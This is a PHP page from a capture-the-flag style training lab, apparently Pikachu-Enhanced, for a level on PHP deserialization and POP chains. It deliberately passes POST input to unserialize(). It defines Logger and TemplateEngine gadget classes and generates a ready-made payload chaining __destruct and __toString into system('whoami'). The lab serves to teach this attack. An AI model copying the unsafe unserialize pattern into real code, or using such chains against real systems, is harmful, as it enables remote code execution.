<?php
/**
 * Pikachu-Enhanced v2.0 - PHP 反序列化漏洞 (PHP Deserialization / POP Chain) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[90] = 'active open';
$ACTIVE[92] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';

// 定义用于教学演示的受害类体系
class Logger {
    public $log_file;
    public $init_msg;

    public function __construct($file = "app.log", $msg = "System initialized") {
        $this->log_file = $file;
        $this->init_msg = $msg;
    }

    public function __destruct() {
        // 当 Logger 对象销毁时，若 init_msg 为字符串则输出，若为对象则触发其 __toString() 魔术方法！
        if (isset($this->init_msg)) {
            echo "<div class='alert alert-info' style='margin:10px 0;'><b>[Logger __destruct]</b> " . $this->init_msg . "</div>";
        }
    }
}

class TemplateEngine {
    public $template;
    public $cache_func;

    public function __construct($tpl = "Hello {name}", $func = "htmlspecialchars") {
        $this->template = $tpl;
        $this->cache_func = $func;
    }

    public function __toString() {
        // POP 链终点：__toString() 调用可变函数 $this->cache_func($this->template)
        $func = $this->cache_func;
        if (is_callable($func)) {
            $res = call_user_func($func, $this->template);
            return "<b>[TemplateEngine Rendered]</b> " . htmlspecialchars($res);
        }
        return "<b>[TemplateEngine]</b> " . htmlspecialchars($this->template);
    }
}

$output_html = "";
$user_payload = $_POST['payload'] ?? '';

if (isset($_POST['submit']) && !empty($user_payload)) {
    ob_start();
    try {
        // 【核心漏洞点】：对用户输入的外部字符串直接调用 unserialize()
        $unserialized_obj = @unserialize($user_payload);
        $executed_out = ob_get_clean();
        
        if ($unserialized_obj === false) {
            $output_html = "<div class='alert alert-warning' style='border-radius:8px; font-weight:700;'>
                <i class='fa fa-exclamation-triangle'></i> 反序列化失败！输入的 Payload 格式不合法或无法反序列化。
            </div>";
        } else {
            $output_html = "<div class='alert alert-success' style='border-radius:8px; font-weight:700; margin-bottom:12px;'>
                <i class='fa fa-check-circle'></i> 成功反序列化对象！触发魔术方法生命周期执行。
            </div>" . $executed_out;
        }
    } catch (Throwable $e) {
        ob_end_clean();
        $output_html = "<div class='alert alert-danger' style='border-radius:8px; font-weight:700;'>
            <i class='fa fa-times-circle'></i> 执行异常: " . htmlspecialchars($e->getMessage()) . "
        </div>";
    }
}

// 预先构造标准的合法与攻击 POP 链 Payload
$legit_logger = new Logger("debug.log", "欢迎使用 Pikachu 日志服务");
$legit_payload = serialize($legit_logger);

$evil_tpl = new TemplateEngine("whoami", "system");
$evil_logger = new Logger("hacked.log", $evil_tpl);
$evil_pop_payload = serialize($evil_logger);
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="unserilization.php">反序列化</a></li>
                <li class="active">PHP 反序列化漏洞 (POP 链)</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 POP 链构造思路" data-content="Logger 对象的 __destruct() 会触发 $init_msg 的字符串转换，当将 $init_msg 设置为 TemplateEngine 对象时，自动触发其 __toString()，进而执行 call_user_func('system', 'whoami')！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🧬 关卡 2: PHP 原生反序列化与 POP 链 (Property-Oriented Programming)
                        <span class="cyber-badge-chip">反序列化 · 魔术方法 · POP 链利用 · 250 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        PHP 反序列化漏洞发生在直接对外部可控字符串调用 <code>unserialize()</code> 的情境中。攻击者利用 PHP 对象的魔术方法生命周期（如 <code>__destruct()</code>、<code>__wakeup()</code>、<code>__toString()</code>），通过篡改对象内部成员属性引用，将原本无害的方法调用链条像多米诺骨牌一样串联成一条通往 <code>call_user_func() / eval() / system()</code> 的 <b>POP 链（面向属性编程）</b>！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Control & Payload Generator -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-code" style="color:var(--primary);"></i> 反序列化输入控制台
                            </h4>

                            <form method="POST" action="unser.php">
                                <div class="form-group" style="margin-bottom:12px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">序列化字符串 (Serialized Payload)：</label>
                                    <textarea class="form-control" id="payload_input" name="payload" rows="4" placeholder="O:6:&quot;Logger&quot;:2:..." style="font-family:'Fira Code', monospace; font-size:12.5px;" required><?php echo htmlspecialchars($user_payload); ?></textarea>
                                </div>

                                <div style="margin-bottom:16px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速填入演练 Payload：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillPayload('<?php echo addslashes($legit_payload); ?>')">
                                            <i class="fa fa-info-circle" style="color:#06b6d4;"></i> <b>正常对象序列化：</b> <code>Logger</code> 基础日志对象
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="fillPayload('<?php echo addslashes($evil_pop_payload); ?>')">
                                            <i class="fa fa-bolt" style="color:#ef4444;"></i> <b>POP 链 RCE Payload：</b> <code>Logger->__destruct()</code> -> <code>TemplateEngine->__toString()</code> -> <code>system('whoami')</code>
                                        </button>
                                    </div>
                                </div>

                                <button type="submit" name="submit" value="submit" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:10px;">
                                    <i class="fa fa-play"></i> 发起 unserialize() 反序列化
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right Column: POP Chain Visualizer -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-sitemap" style="color:#10b981;"></i> 后端 Gadget POP 链原理透视
                            </h4>

                            <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:12px; line-height:1.7; margin-bottom:14px;">
                                <span style="color:#f59e0b; font-weight:700;">1. 入口 (Entry):</span> <code>Logger::__destruct()</code><br/>
                                &nbsp;&nbsp;&nbsp;&nbsp;↳ 触发 <code>echo $this->init_msg;</code><br/>
                                <span style="color:#8b5cf6; font-weight:700;">2. 跳板 (Hop):</span> <code>TemplateEngine::__toString()</code><br/>
                                &nbsp;&nbsp;&nbsp;&nbsp;↳ 触发 <code>call_user_func($this->cache_func, $this->template);</code><br/>
                                <span style="color:#ef4444; font-weight:700;">3. 终点 (Sink):</span> <code>system("whoami")</code> -> <span style="color:#ef4444; font-weight:700;">RCE</span>
                            </div>

                            <h4 style="margin:0 0 10px 0; color:var(--text-primary); font-weight:800; font-size:14px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> 执行结果输出
                            </h4>
                            <?php if (!empty($output_html)): echo $output_html; else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:18px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-info-circle"></i> 点击左侧 POP 链载荷并点击提交查看执行结果
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="unserilization.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：反序列化概述</a>
                    <a href="../java_unserialize/java_unserialize.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：Java 原生反序列化 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function fillPayload(p) {
    document.getElementById('payload_input').value = p;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
